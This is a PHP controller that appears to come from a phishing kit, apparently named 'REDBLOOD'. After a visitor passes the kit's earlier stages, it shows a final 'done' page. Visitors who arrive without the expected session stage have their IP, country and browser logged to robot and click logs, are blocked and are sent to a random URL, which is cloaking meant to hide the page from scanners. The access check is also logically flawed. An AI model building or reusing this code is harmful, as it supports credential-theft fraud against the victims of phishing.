<?php
defined("ALLOW") or exit('No direct script access allowed');

class Finished
{
	public $goRBLD;
	public function __construct()
	{
		$this->goRBLD = new goRBLD();

		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 8)) {

			write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}\r\n");
			write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Access Denied! Incorrect Parameter\r\n");
			_blocks();
			redirect(uriRand());
		}
	}

	public function index()
	{
		if ($this->goRBLD->is_mobile) {
			echo view('mobile/done');
		} else {
			echo view('pc/done');
		}
	}

	public function logout()
	{
		session_destroy();
		_blocks();
		redirect(uriRand());
	}
}